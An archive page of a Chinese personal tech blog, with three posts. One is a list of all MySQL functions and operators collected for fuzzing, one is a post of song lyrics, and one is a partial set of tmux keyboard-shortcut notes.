<!DOCTYPE html>












  


<html class="theme-next pisces use-motion" lang="zh-Hans">
<head><meta name="generator" content="Hexo 3.8.0">
  <meta charset="UTF-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">












<meta http-equiv="Cache-Control" content="no-transform">
<meta http-equiv="Cache-Control" content="no-siteapp">






















<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">

<link href="/css/main.css?v=6.3.0" rel="stylesheet" type="text/css">


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=6.3.0">


  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=6.3.0">


  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=6.3.0">


  <link rel="mask-icon" href="/images/logo.svg?v=6.3.0" color="#222">









<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Pisces',
    version: '6.3.0',
    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
    fancybox: false,
    fastclick: false,
    lazyload: false,
    tabs: true,
    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>


  




  <meta name="description" content="personal blog">
<meta name="keywords" content="ctf web IT">
<meta property="og:type" content="website">
<meta property="og:title" content="Image&#39;s blog">
<meta property="og:url" content="https://hexo.imagemlt.xyz/page/3/index.html">
<meta property="og:site_name" content="Image&#39;s blog">
<meta property="og:description" content="personal blog">
<meta property="og:locale" content="zh-Hans">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="Image&#39;s blog">
<meta name="twitter:description" content="personal blog">






  <link rel="canonical" href="https://hexo.imagemlt.xyz/page/3/">



<script type="text/javascript" id="page.configurations">
  CONFIG.page = {
    sidebar: "",
  };
</script>

  <title>Image's blog &mdash; Welcome to Image's Blog</title>
  









  <noscript>
  <style type="text/css">
    .use-motion .motion-element,
    .use-motion .brand,
    .use-motion .menu-item,
    .sidebar-inner,
    .use-motion .post-block,
    .use-motion .pagination,
    .use-motion .comments,
    .use-motion .post-header,
    .use-motion .post-body,
    .use-motion .collection-title { opacity: initial; }

    .use-motion .logo,
    .use-motion .site-title,
    .use-motion .site-subtitle {
      opacity: initial;
      top: initial;
    }

    .use-motion {
      .logo-line-before i { left: initial; }
      .logo-line-after i { right: initial; }
    }
  </style>
</noscript>

</head>

<body itemscope="" itemtype="http://schema.org/WebPage" lang="zh-Hans">
	<a href="https://github.com/imagemlt"><img style="position: absolute; top: 0; right: 0; border: 0;z-index:1" src="https://s3.amazonaws.com/github/ribbons/forkme_right_orange_ff7600.png" alt="Fork me on GitHub"></a>
  
  
    
  

  <div class="container sidebar-position-left 
  page-home">
    <div class="headband"></div>

    <header id="header" class="header" itemscope="" itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta ">
    

    <div class="custom-logo-site-title">
      <a href="/" class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">Image's blog</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
    
      
        <h1 class="site-subtitle" itemprop="description">Welcome to Image's Blog</h1>
      
    
  </div>

  <div class="site-nav-toggle">
    <button aria-label="Toggle navigation bar">
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>



<nav class="site-nav">
  
    <ul id="menu" class="menu">
      
        
        
        
          
          <li class="menu-item menu-item-home">
    <a href="/" rel="section">
      <i class="menu-item-icon fa fa-fw fa-home"></i> <br>Home</a>
  </li>
        
        
        
          
          <li class="menu-item menu-item-about">
    <a href="/about/" rel="section">
      <i class="menu-item-icon fa fa-fw fa-user"></i> <br>About</a>
  </li>
        
        
        
          
          <li class="menu-item menu-item-tags">
    <a href="/tags/" rel="section">
      <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>Tags</a>
  </li>
        
        
        
          
          <li class="menu-item menu-item-categories">
    <a href="/categories/" rel="section">
      <i class="menu-item-icon fa fa-fw fa-th"></i> <br>Categories</a>
  </li>
        
        
        
          
          <li class="menu-item menu-item-archives">
    <a href="/archives/" rel="section">
      <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>Archives</a>
  </li>
        
        
        
          
          <li class="menu-item menu-item-links">
    <a href="/links/" rel="section">
      <i class="menu-item-icon fa fa-fw fa-link"></i> <br>Links</a>
  </li>

      
      
    </ul>
  

  

  
</nav>



  



</div>
    </header>

    


    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          
            

          
          <div id="content" class="content">
            
  <section id="posts" class="posts-expand">
    
      

  

  
  
  

  

  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://hexo.imagemlt.xyz/post/mysql-functions/index.html">

    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Imagemlt">
      <meta itemprop="description" content="personal blog">
      <meta itemprop="image" content="https://avatars0.githubusercontent.com/u/26888704?s=460&v=4">
    </span>

    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Image's blog">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/post/mysql-functions/index.html" itemprop="url">
                  mysql中的所有函数汇总（Fuzz用）
                </a>
              
            
          </h2>
        

        <div class="post-meta">
          <span class="post-time">

            
            
            

            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              

              
                
              

              <time title="Created: 2018-04-15 22:04:35" itemprop="dateCreated datePublished" datetime="2018-04-15T22:04:35+08:00">2018-04-15</time>
            

            
              

              
                
                <span class="post-meta-divider">|</span>
                

                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                
                  <span class="post-meta-item-text">Edited on</span>
                
                <time title="Modified: 2019-02-02 08:29:25" itemprop="dateModified" datetime="2019-02-02T08:29:25+08:00">2019-02-02</time>
              
            
          </span>

          
            <span class="post-category">
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">In</span>
              
              
                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing"><a href="/categories/人生杂谈/" itemprop="url" rel="index"><span itemprop="name">人生杂谈</span></a></span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <pre><code>[u&apos;ABS()&apos;, u&apos;ACOS()&apos;, u&apos;ADDDATE()&apos;, u&apos;ADDTIME()&apos;, u&apos;AES_DECRYPT()&apos;, u&apos;AES_ENCRYPT()&apos;, u&apos;AND, &amp;&amp;&apos;, u&apos;Area()&apos;, u&apos;AsBinary(), AsWKB()&apos;, u&apos;ASCII()&apos;, u&apos;ASIN()&apos;, u&apos;=&apos;, u&apos;:=&apos;, u&apos;AsText(), AsWKT()&apos;, u&apos;ATAN()&apos;, u&apos;ATAN2(), ATAN()&apos;, u&apos;AVG()&apos;, u&apos;BENCHMARK()&apos;, u&apos;BETWEEN ... AND ...&apos;, u&apos;BIN()&apos;, u&apos;BINARY&apos;, u&apos;BIT_AND()&apos;, u&apos;BIT_COUNT()&apos;, u&apos;BIT_LENGTH()&apos;, u&apos;BIT_OR()&apos;, u&apos;BIT_XOR()&apos;, u&apos;&amp;&apos;, u&apos;~&apos;, u&apos;|&apos;, u&apos;^&apos;, u&apos;CASE&apos;, u&apos;CAST()&apos;, u&apos;CEIL()&apos;, u&apos;CEILING()&apos;, u&apos;Centroid()&apos;, u&apos;CHAR()&apos;, u&apos;CHAR_LENGTH()&apos;, u&apos;CHARACTER_LENGTH()&apos;, u&apos;CHARSET()&apos;, u&apos;COALESCE()&apos;, u&apos;COERCIBILITY()&apos;, u&apos;COLLATION()&apos;, u&apos;COMPRESS()&apos;, u&apos;CONCAT()&apos;, u&apos;CONCAT_WS()&apos;, u&apos;CONNECTION_ID()&apos;, u&apos;Contains()&apos;, u&apos;CONV()&apos;, u&apos;CONVERT()&apos;, u&apos;CONVERT_TZ()&apos;, u&apos;COS()&apos;, u&apos;COT()&apos;, u&apos;COUNT()&apos;, u&apos;COUNT(DISTINCT)&apos;, u&apos;CRC32()&apos;, u&apos;Crosses()&apos;, u&apos;CURDATE()&apos;, u&apos;CURRENT_DATE(), CURRENT_DATE&apos;, u&apos;CURRENT_TIME(), CURRENT_TIME&apos;, u&apos;CURRENT_TIMESTAMP(), CURRENT_TIMESTAMP&apos;, u&apos;CURRENT_USER(), CURRENT_USER&apos;, u&apos;CURTIME()&apos;, u&apos;DATABASE()&apos;, u&apos;DATE()&apos;, u&apos;DATE_ADD()&apos;, u&apos;DATE_FORMAT()&apos;, u&apos;DATE_SUB()&apos;, u&apos;DATEDIFF()&apos;, u&apos;DAY()&apos;, u&apos;DAYNAME()&apos;, u&apos;DAYOFMONTH()&apos;, u&apos;DAYOFWEEK()&apos;, u&apos;DAYOFYEAR()&apos;, u&apos;DECODE()&apos;, u&apos;DEFAULT()&apos;, u&apos;DEGREES()&apos;, u&apos;DES_DECRYPT()&apos;, u&apos;DES_ENCRYPT()&apos;, u&apos;Dimension()&apos;, u&apos;Disjoint()&apos;, u&apos;DIV&apos;, u&apos;/&apos;, u&apos;ELT()&apos;, u&apos;ENCODE()&apos;, u&apos;ENCRYPT()&apos;, u&apos;EndPoint()&apos;, u&apos;Envelope()&apos;, u&apos;=&apos;, u&apos;&lt;=&gt;&apos;, u&apos;Equals()&apos;, u&apos;EXP()&apos;, u&apos;EXPORT_SET()&apos;, u&apos;ExteriorRing()&apos;, u&apos;EXTRACT()&apos;, u&apos;ExtractValue()&apos;, u&apos;FIELD()&apos;, u&apos;FIND_IN_SET()&apos;, u&apos;FLOOR()&apos;, u&apos;FORMAT()&apos;, u&apos;FOUND_ROWS()&apos;, u&apos;FROM_DAYS()&apos;, u&apos;FROM_UNIXTIME()&apos;, u&apos;GeomCollFromText(), GeometryCollectionFromText()&apos;, u&apos;GeomCollFromWKB(), GeometryCollectionFromWKB()&apos;, u&apos;GeometryCollection()&apos;, u&apos;GeometryN()&apos;, u&apos;GeometryType()&apos;, u&apos;GeomFromText(), GeometryFromText()&apos;, u&apos;GeomFromWKB(), GeometryFromWKB()&apos;, u&apos;GET_FORMAT()&apos;, u&apos;GET_LOCK()&apos;, u&apos;GLength()&apos;, u&apos;&gt;&apos;, u&apos;&gt;=&apos;, u&apos;GREATEST()&apos;, u&apos;GROUP_CONCAT()&apos;, u&apos;HEX()&apos;, u&apos;HOUR()&apos;, u&apos;IF()&apos;, u&apos;IFNULL()&apos;, u&apos;IN()&apos;, u&apos;INET_ATON()&apos;, u&apos;INET_NTOA()&apos;, u&apos;INSERT()&apos;, u&apos;INSTR()&apos;, u&apos;InteriorRingN()&apos;, u&apos;Intersects()&apos;, u&apos;INTERVAL()&apos;, u&apos;IS&apos;, u&apos;IS_FREE_LOCK()&apos;, u&apos;IS NOT&apos;, u&apos;IS NOT NULL&apos;, u&apos;IS NULL&apos;, u&apos;IS_USED_LOCK()&apos;, u&apos;IsClosed()&apos;, u&apos;IsEmpty()&apos;, u&apos;ISNULL()&apos;, u&apos;IsSimple()&apos;, u&apos;LAST_DAY&apos;, u&apos;LAST_INSERT_ID()&apos;, u&apos;LCASE()&apos;, u&apos;LEAST()&apos;, u&apos;LEFT()&apos;, u&apos;&lt;&lt;&apos;, u&apos;LENGTH()&apos;, u&apos;&lt;&apos;, u&apos;&lt;=&apos;, u&apos;LIKE&apos;, u&apos;LineFromText(), LineStringFromText()&apos;, u&apos;LineFromWKB(), LineStringFromWKB()&apos;, u&apos;LineString()&apos;, u&apos;LN()&apos;, u&apos;LOAD_FILE()&apos;, u&apos;LOCALTIME(), LOCALTIME&apos;, u&apos;LOCALTIMESTAMP, LOCALTIMESTAMP()&apos;, u&apos;LOCATE()&apos;, u&apos;LOG()&apos;, u&apos;LOG10()&apos;, u&apos;LOG2()&apos;, u&apos;LOWER()&apos;, u&apos;LPAD()&apos;, u&apos;LTRIM()&apos;, u&apos;MAKE_SET()&apos;, u&apos;MAKEDATE()&apos;, u&apos;MAKETIME()&apos;, u&apos;MASTER_POS_WAIT()&apos;, u&apos;MATCH&apos;, u&apos;MAX()&apos;, u&apos;MBRContains()&apos;, u&apos;MBRDisjoint()&apos;, u&apos;MBREqual()&apos;, u&apos;MBRIntersects()&apos;, u&apos;MBROverlaps()&apos;, u&apos;MBRTouches()&apos;, u&apos;MBRWithin()&apos;, u&apos;MD5()&apos;, u&apos;MICROSECOND()&apos;, u&apos;MID()&apos;, u&apos;MIN()&apos;, u&apos;-&apos;, u&apos;MINUTE()&apos;, u&apos;MLineFromText(), MultiLineStringFromText()&apos;, u&apos;MLineFromWKB(), MultiLineStringFromWKB()&apos;, u&apos;MOD()&apos;, u&apos;%, MOD&apos;, u&apos;MONTH()&apos;, u&apos;MONTHNAME()&apos;, u&apos;MPointFromText(), MultiPointFromText()&apos;, u&apos;MPointFromWKB(), MultiPointFromWKB()&apos;, u&apos;MPolyFromText(), MultiPolygonFromText()&apos;, u&apos;MPolyFromWKB(), MultiPolygonFromWKB()&apos;, u&apos;MultiLineString()&apos;, u&apos;MultiPoint()&apos;, u&apos;MultiPolygon()&apos;, u&apos;NAME_CONST()&apos;, u&apos;NOT, !&apos;, u&apos;NOT BETWEEN ... AND ...&apos;, u&apos;!=, &lt;&gt;&apos;, u&apos;NOT IN()&apos;, u&apos;NOT LIKE&apos;, u&apos;NOT REGEXP&apos;, u&apos;NOW()&apos;, u&apos;NULLIF()&apos;, u&apos;NumGeometries()&apos;, u&apos;NumInteriorRings()&apos;, u&apos;NumPoints()&apos;, u&apos;OCT()&apos;, u&apos;OCTET_LENGTH()&apos;, u&apos;OLD_PASSWORD()&apos;, u&apos;||, OR&apos;, u&apos;ORD()&apos;, u&apos;Overlaps()&apos;, u&apos;PASSWORD()&apos;, u&apos;PERIOD_ADD()&apos;, u&apos;PERIOD_DIFF()&apos;, u&apos;PI()&apos;, u&apos;+&apos;, u&apos;Point()&apos;, u&apos;PointFromText()&apos;, u&apos;PointFromWKB()&apos;, u&apos;PointN()&apos;, u&apos;PolyFromText(), PolygonFromText()&apos;, u&apos;PolyFromWKB(), PolygonFromWKB()&apos;, u&apos;Polygon()&apos;, u&apos;POSITION()&apos;, u&apos;POW()&apos;, u&apos;POWER()&apos;, u&apos;PROCEDURE ANALYSE()&apos;, u&apos;QUARTER()&apos;, u&apos;QUOTE()&apos;, u&apos;RADIANS()&apos;, u&apos;RAND()&apos;, u&apos;REGEXP&apos;, u&apos;RELEASE_LOCK()&apos;, u&apos;REPEAT()&apos;, u&apos;REPLACE()&apos;, u&apos;REVERSE()&apos;, u&apos;RIGHT()&apos;, u&apos;&gt;&gt;&apos;, u&apos;RLIKE&apos;, u&apos;ROUND()&apos;, u&apos;ROW_COUNT()&apos;, u&apos;RPAD()&apos;, u&apos;RTRIM()&apos;, u&apos;SCHEMA()&apos;, u&apos;SEC_TO_TIME()&apos;, u&apos;SECOND()&apos;, u&apos;SESSION_USER()&apos;, u&apos;SHA1(), SHA()&apos;, u&apos;SHA2()&apos;, u&apos;SIGN()&apos;, u&apos;SIN()&apos;, u&apos;SLEEP()&apos;, u&apos;SOUNDEX()&apos;, u&apos;SOUNDS LIKE&apos;, u&apos;SPACE()&apos;, u&apos;SQRT()&apos;, u&apos;SRID()&apos;, u&apos;StartPoint()&apos;, u&apos;STD()&apos;, u&apos;STDDEV()&apos;, u&apos;STDDEV_POP()&apos;, u&apos;STDDEV_SAMP()&apos;, u&apos;STR_TO_DATE()&apos;, u&apos;STRCMP()&apos;, u&apos;SUBDATE()&apos;, u&apos;SUBSTR()&apos;, u&apos;SUBSTRING()&apos;, u&apos;SUBSTRING_INDEX()&apos;, u&apos;SUBTIME()&apos;, u&apos;SUM()&apos;, u&apos;SYSDATE()&apos;, u&apos;SYSTEM_USER()&apos;, u&apos;TAN()&apos;, u&apos;TIME()&apos;, u&apos;TIME_FORMAT()&apos;, u&apos;TIME_TO_SEC()&apos;, u&apos;TIMEDIFF()&apos;, u&apos;*&apos;, u&apos;TIMESTAMP()&apos;, u&apos;TIMESTAMPADD()&apos;, u&apos;TIMESTAMPDIFF()&apos;, u&apos;TO_DAYS()&apos;, u&apos;TO_SECONDS()&apos;, u&apos;Touches()&apos;, u&apos;TRIM()&apos;, u&apos;TRUNCATE()&apos;, u&apos;UCASE()&apos;, u&apos;-&apos;, u&apos;UNCOMPRESS()&apos;, u&apos;UNCOMPRESSED_LENGTH()&apos;, u&apos;UNHEX()&apos;, u&apos;UNIX_TIMESTAMP()&apos;, u&apos;UpdateXML()&apos;, u&apos;UPPER()&apos;, u&apos;USER()&apos;, u&apos;UTC_DATE()&apos;, u&apos;UTC_TIME()&apos;, u&apos;UTC_TIMESTAMP()&apos;, u&apos;UUID()&apos;, u&apos;UUID_SHORT()&apos;, u&apos;VALUES()&apos;, u&apos;VAR_POP()&apos;, u&apos;VAR_SAMP()&apos;, u&apos;VARIANCE()&apos;, u&apos;VERSION()&apos;, u&apos;WEEK()&apos;, u&apos;WEEKDAY()&apos;, u&apos;WEEKOFYEAR()&apos;, u&apos;Within()&apos;, u&apos;X()&apos;, u&apos;XOR&apos;, u&apos;Y()&apos;, u&apos;YEAR()&apos;, u&apos;YEARWEEK()&apos;]


ABS()
ACOS()
ADDDATE()
ADDTIME()
AES_DECRYPT()
AES_ENCRYPT()
AND, &amp;&amp;
Area()
AsBinary(), AsWKB()
ASCII()
ASIN()
=
:=
AsText(), AsWKT()
ATAN()
ATAN2(), ATAN()
AVG()
BENCHMARK()
BETWEEN ... AND ...
BIN()
BINARY
BIT_AND()
BIT_COUNT()
BIT_LENGTH()
BIT_OR()
BIT_XOR()
&amp;
~
|
^
CASE
CAST()
CEIL()
CEILING()
Centroid()
CHAR()
CHAR_LENGTH()
CHARACTER_LENGTH()
CHARSET()
COALESCE()
COERCIBILITY()
COLLATION()
COMPRESS()
CONCAT()
CONCAT_WS()
CONNECTION_ID()
Contains()
CONV()
CONVERT()
CONVERT_TZ()
COS()
COT()
COUNT()
COUNT(DISTINCT)
CRC32()
Crosses()
CURDATE()
CURRENT_DATE(), CURRENT_DATE
CURRENT_TIME(), CURRENT_TIME
CURRENT_TIMESTAMP(), CURRENT_TIMESTAMP
CURRENT_USER(), CURRENT_USER
CURTIME()
DATABASE()
DATE()
DATE_ADD()
DATE_FORMAT()
DATE_SUB()
DATEDIFF()
DAY()
DAYNAME()
DAYOFMONTH()
DAYOFWEEK()
DAYOFYEAR()
DECODE()
DEFAULT()
DEGREES()
DES_DECRYPT()
DES_ENCRYPT()
Dimension()
Disjoint()
DIV
/
ELT()
ENCODE()
ENCRYPT()
EndPoint()
Envelope()
=
&lt;=&gt;
Equals()
EXP()
EXPORT_SET()
ExteriorRing()
EXTRACT()
ExtractValue()
FIELD()
FIND_IN_SET()
FLOOR()
FORMAT()
FOUND_ROWS()
FROM_DAYS()
FROM_UNIXTIME()
GeomCollFromText(), GeometryCollectionFromText()
GeomCollFromWKB(), GeometryCollectionFromWKB()
GeometryCollection()
GeometryN()
GeometryType()
GeomFromText(), GeometryFromText()
GeomFromWKB(), GeometryFromWKB()
GET_FORMAT()
GET_LOCK()
GLength()
&gt;
&gt;=
GREATEST()
GROUP_CONCAT()
HEX()
HOUR()
IF()
IFNULL()
IN()
INET_ATON()
INET_NTOA()
INSERT()
INSTR()
InteriorRingN()
Intersects()
INTERVAL()
IS
IS_FREE_LOCK()
IS NOT
IS NOT NULL
IS NULL
IS_USED_LOCK()
IsClosed()
IsEmpty()
ISNULL()
IsSimple()
LAST_DAY
LAST_INSERT_ID()
LCASE()
LEAST()
LEFT()
&lt;&lt;
LENGTH()
&lt;
&lt;=
LIKE
LineFromText(), LineStringFromText()
LineFromWKB(), LineStringFromWKB()
LineString()
LN()
LOAD_FILE()
LOCALTIME(), LOCALTIME
LOCALTIMESTAMP, LOCALTIMESTAMP()
LOCATE()
LOG()
LOG10()
LOG2()
LOWER()
LPAD()
LTRIM()
MAKE_SET()
MAKEDATE()
MAKETIME()
MASTER_POS_WAIT()
MATCH
MAX()
MBRContains()
MBRDisjoint()
MBREqual()
MBRIntersects()
MBROverlaps()
MBRTouches()
MBRWithin()
MD5()
MICROSECOND()
MID()
MIN()
-
MINUTE()
MLineFromText(), MultiLineStringFromText()
MLineFromWKB(), MultiLineStringFromWKB()
MOD()
%, MOD
MONTH()
MONTHNAME()
MPointFromText(), MultiPointFromText()
MPointFromWKB(), MultiPointFromWKB()
MPolyFromText(), MultiPolygonFromText()
MPolyFromWKB(), MultiPolygonFromWKB()
MultiLineString()
MultiPoint()
MultiPolygon()
NAME_CONST()
NOT, !
NOT BETWEEN ... AND ...
!=, &lt;&gt;
NOT IN()
NOT LIKE
NOT REGEXP
NOW()
NULLIF()
NumGeometries()
NumInteriorRings()
NumPoints()
OCT()
OCTET_LENGTH()
OLD_PASSWORD()
||, OR
ORD()
Overlaps()
PASSWORD()
PERIOD_ADD()
PERIOD_DIFF()
PI()
+
Point()
PointFromText()
PointFromWKB()
PointN()
PolyFromText(), PolygonFromText()
PolyFromWKB(), PolygonFromWKB()
Polygon()
POSITION()
POW()
POWER()
PROCEDURE ANALYSE()
QUARTER()
QUOTE()
RADIANS()
RAND()
REGEXP
RELEASE_LOCK()
REPEAT()
REPLACE()
REVERSE()
RIGHT()
&gt;&gt;
RLIKE
ROUND()
ROW_COUNT()
RPAD()
RTRIM()
SCHEMA()
SEC_TO_TIME()
SECOND()
SESSION_USER()
SHA1(), SHA()
SHA2()
SIGN()
SIN()
SLEEP()
SOUNDEX()
SOUNDS LIKE
SPACE()
SQRT()
SRID()
StartPoint()
STD()
STDDEV()
STDDEV_POP()
STDDEV_SAMP()
STR_TO_DATE()
STRCMP()
SUBDATE()
SUBSTR()
SUBSTRING()
SUBSTRING_INDEX()
SUBTIME()
SUM()
SYSDATE()
SYSTEM_USER()
TAN()
TIME()
TIME_FORMAT()
TIME_TO_SEC()
TIMEDIFF()
*
TIMESTAMP()
TIMESTAMPADD()
TIMESTAMPDIFF()
TO_DAYS()
TO_SECONDS()
Touches()
TRIM()
TRUNCATE()
UCASE()
-
UNCOMPRESS()
UNCOMPRESSED_LENGTH()
UNHEX()
UNIX_TIMESTAMP()
UpdateXML()
UPPER()
USER()
UTC_DATE()
UTC_TIME()
UTC_TIMESTAMP()
UUID()
UUID_SHORT()
VALUES()
VAR_POP()
VAR_SAMP()
VARIANCE()
VERSION()
WEEK()
WEEKDAY()
WEEKOFYEAR()
Within()
X()
XOR
Y()
YEAR()
YEARWEEK()
</code></pre>
          
        
      
    </div>

    

    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  

  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://hexo.imagemlt.xyz/post/wmj/index.html">

    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Imagemlt">
      <meta itemprop="description" content="personal blog">
      <meta itemprop="image" content="https://avatars0.githubusercontent.com/u/26888704?s=460&v=4">
    </span>

    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Image's blog">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/post/wmj/index.html" itemprop="url">
                  春夏秋冬的你
                </a>
              
            
          </h2>
        

        <div class="post-meta">
          <span class="post-time">

            
            
            

            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              

              
                
              

              <time title="Created: 2018-01-08 16:56:49" itemprop="dateCreated datePublished" datetime="2018-01-08T16:56:49+08:00">2018-01-08</time>
            

            
              

              
                
                <span class="post-meta-divider">|</span>
                

                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                
                  <span class="post-meta-item-text">Edited on</span>
                
                <time title="Modified: 2019-02-02 08:29:25" itemprop="dateModified" datetime="2019-02-02T08:29:25+08:00">2019-02-02</time>
              
            
          </span>

          
            <span class="post-category">
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">In</span>
              
              
                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing"><a href="/categories/人生杂谈/" itemprop="url" rel="index"><span itemprop="name">人生杂谈</span></a></span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>那年春天 我迷失在梦里 那年夏天 像她一样恬静 那年秋天的风 映入慌乱的耳际 那年冬天 身边缺了你 如果春天 梦里面没有你 如果夏天 街角遇不见你 就算秋天的风 带你回不到这里 我的心 就像 冰冷的冬季 春夏秋冬失去了你 我怎么过一年四季 漫无目的地胡言乱语 让我独白出谁的回忆 春夏秋冬放开了你 你让我怎么平静 你的话就像 秋风无情 那年春天 我迷失在梦里 那年夏天 像她一样恬静 那年秋天的风 映入慌乱的耳际 那年冬天 身边缺了你 如果春天 梦里面没有你 如果夏天 街角遇不见你 就算秋天的风 带你回不到这里 我的心 就像 冰冷的冬季 春夏秋冬失去了你 我怎么过一年四季 漫无目的地胡言乱语 让我独白出谁的回忆 春夏秋冬放开了你 你让我怎么平静 你的话就像 秋风无情 春夏秋冬失去了你 我怎么过一年四季 漫无目的地胡言乱语 让我独白出谁的回忆 春夏秋冬放开了你 你让我怎么平静 你的话就像 秋风无情 怎么去寻找 春天的轨迹 看着大雁 一起回归远方 心中想着 伴随 你的姑娘 看着落叶飘落 回到家乡的彷徨 保持着 习惯的想象</p>

          
        
      
    </div>

    

    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  

  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://hexo.imagemlt.xyz/post/tmux-notes/index.html">

    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Imagemlt">
      <meta itemprop="description" content="personal blog">
      <meta itemprop="image" content="https://avatars0.githubusercontent.com/u/26888704?s=460&v=4">
    </span>

    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Image's blog">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/post/tmux-notes/index.html" itemprop="url">
                  tmux快捷键记录
                </a>
              
            
          </h2>
        

        <div class="post-meta">
          <span class="post-time">

            
            
            

            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              

              
                
              

              <time title="Created: 2017-12-24 23:00:48" itemprop="dateCreated datePublished" datetime="2017-12-24T23:00:48+08:00">2017-12-24</time>
            

            
              

              
                
                <span class="post-meta-divider">|</span>
                

                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                
                  <span class="post-meta-item-text">Edited on</span>
                
                <time title="Modified: 2019-02-02 08:29:25" itemprop="dateModified" datetime="2019-02-02T08:29:25+08:00">2019-02-02</time>
              
            
          </span>

          
            <span class="post-category">
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">In</span>
              
              
                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing"><a href="/categories/人生杂谈/" itemprop="url" rel="index"><span itemprop="name">人生杂谈</span></a></span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <ul>
<li><p>进入tmux面板后，一定要先按ctrl+b，然后松开，再按其他的组合键才生效。</p>
</li>
<li><p>常用到的几个组合键：</p>
<ul>
<li>ctrl+b ? 显示快捷键帮助</li>
<li>ctrl+b 空格键 采用下一个内置布局，这个很有意思，在多屏时，用这个就会将多有屏幕竖着展示</li>
<li>ctrl+b ! 把当前窗口变为新窗口</li>
<li>ctrl+b “ 模向分隔窗口</li>
<li>ctrl+b % 纵向分隔窗口</li>
<li>ctrl+b q 显示分隔窗口的编号</li>
<li>ctrl+b o 跳到下一个分隔窗口。多屏之间的切换</li>
<li>ctrl+b 上下键 上一个及下一个分隔窗口</li>
<li>ctrl+b C-方向键 调整分隔窗口大小</li>
<li>ctrl+b &amp; 确认后退出当前tmux</li>
<li>ctrl+b [ 复制模式，即将当前屏幕移到上一个的位置上，其他所有窗口都向前移动一个。</li>
<li>ctrl+b c 创建新窗口</li>
